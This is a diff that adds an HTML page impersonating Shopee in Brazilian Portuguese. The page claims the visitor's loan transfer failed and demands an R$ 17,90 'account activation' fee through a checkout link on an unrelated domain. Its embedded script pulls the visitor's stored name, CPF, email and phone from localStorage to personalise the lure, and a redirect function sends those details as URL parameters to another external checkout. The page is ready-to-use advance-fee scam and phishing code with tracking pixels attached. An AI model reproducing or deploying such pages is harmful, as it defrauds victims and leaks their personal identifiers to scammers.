@@ -1,0 +1,112 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <script>
+  window.pixelId = "6830e917ec4bfd6b100a124c";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Transferência Não Concluída</title>
+        <script src="../assets/js/links.js"></script>
+    <script src="js/latest.html" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+  <style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial, Helvetica, sans-serif}.card{width:100%;overflow:hidden}.topbar{background-color:#ef4c28;color:#fff;padding:1rem;display:flex;align-items:center;justify-content:space-between}.user-info{display:flex;align-items:center;gap:.5rem;font-size:1rem;font-weight:500}.user-info img{width:50px;height:50px}.icons{display:flex;gap:1.5rem}.icons img{height:24px}.main-header{background-color:#ef4c28;color:#fff;padding:1rem;padding-left:1.5rem;padding-bottom:2.5rem}.main-header h2{font-size:1.2rem;margin-bottom:.4rem}.main-header p{font-weight:200;font-size:.9rem}.content{padding:1.5rem 1rem;background-color:#fff}.line{display:flex;align-items:flex-start;gap:1rem;margin-bottom:1.2rem}.line img{width:40px;height:40px;margin-top:2px}.line p{font-size:.95rem;color:#222;line-height:1.4}.bold{font-weight:bold}.button{width:100%;margin-top:1rem;background-color:#53d768;color:#fff;border:none;padding:1rem;font-size:1rem;font-weight:bold;border-radius:10px;cursor:pointer}.timer{text-align:center;margin:1rem 0 1.5rem;font-size:.95rem;color:#000}</style>
+</head>
+<body>
+  <div class="card">
+    <div class="topbar">
+      <div class="user-info">
+        <img src="images/user2.svg" alt="Avatar">
+        <span><strong>Olá, Usuário</strong></span>
+      </div>
+      <div class="icons">
+        <img src="images/3.svg" alt="icons">
+        <img src="images/4.svg" alt="icons">
+        <img src="images/5.svg" alt="icons">
+      </div>
+    </div>
+
+    <div class="main-header">
+      <h2>Transferência não concluída</h2>
+      <p>Falta pouco para você receber seu empréstimo! Veja abaixo como aprovar</p>
+    </div>
+
+    <div class="content">
+      <div class="line">
+        <img src="images/warning2.svg" alt="Alerta">
+        <p>Durante a transferência, foi identificado uma pendência vinculada a sua conta</p>
+      </div>
+
+      <div class="line">
+        <img src="images/doc2.svg" alt="Fatura">
+        <p><span class="bold">Usuário</span>, a shopee agora também é um banco 100% digital e você precisa realizar ativação da sua conta bancária para receber seu empréstimo, a ativação possui uma pequena taxa no valor de <span class="bold">R$ 17,90</span> pago um única vez</p>
+      </div>
+
+      <div class="line">
+        <img src="images/82.svg" alt="Info">
+        <p>Para o recebimento do seu valor é obrigatório estar em conformidade</p>
+      </div>
+
+      <div class="line">
+        <img src="images/checked2.svg" alt="Check">
+        <p>O seu empréstimo no valor de <span class="bold">R$*.***,**</span> será liberada após a ativação da conta</p>
+      </div>
+
+      <a href="https://pay.compraseguraverificada.site/checkout/648a4045-fb22-437f-93b9-0b21d68400c5"><button class="button" onclick="">Efetuar ativação da conta</button></a>
+      <!-- <div class="timer">Tempo restante: <span id="timer">15:00</span></div> -->
+    </div>
+  </div>
+
+<script>
+  // Puxa os dados do localStorage
+  const dados = JSON.parse(localStorage.getItem("dadosUsuario")) || {};
+  const cpfRaw = localStorage.getItem("cpfUsuario") || "";
+  const email = dados.EMAIL || "Email não informado";
+  const telefoneRaw = dados.TELEFONE || "";
+  const nomeCompleto = dados.NOME || "Usuário Shopee";
+
+  // Extrai o primeiro nome
+  const primeiroNome = nomeCompleto.trim().split(" ")[0];
+
+  // Atualiza texto "Olá, Nome"
+  const spanUserInfo = document.querySelector(".user-info span");
+  if (spanUserInfo) {
+    spanUserInfo.innerHTML = `<strong>Olá, ${primeiroNome}</strong>`;
+  }
+
+  // Atualiza nome completo na fatura
+  const faturaNome = document.querySelector(".line .bold");
+  if (faturaNome) {
+    faturaNome.textContent = nomeCompleto.toUpperCase();
+  }
+
+  // Redireciona para pagamento com os dados do lead
+  function redirecionarParaPagamento() {
+    const urlBase = "https://go.iexperience-app.com/checkout/650df0a9-9803-4a49-a1a1-515e801926f8";
+    const params = new URLSearchParams();
+
+    if (nomeCompleto) params.set("name", nomeCompleto);
+    if (cpfRaw) params.set("document", cpfRaw);
+    if (email) params.set("email", email);
+    if (telefoneRaw) params.set("telephone", telefoneRaw);
+
+    window.location.href = `${urlBase}?${params.toString()}`;
+  }
+</script>
+
+  
+<script>window.pixelId="68104c52a3d905d3f8e3b553";var a=document.createElement("script");a.setAttribute("async","");a.setAttribute("defer","");a.setAttribute("src","../../../../cdn.utmify.com.br/scripts/pixel/pixel.js");document.head.appendChild(a);</script>
+
+<script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
+
+</body></html>
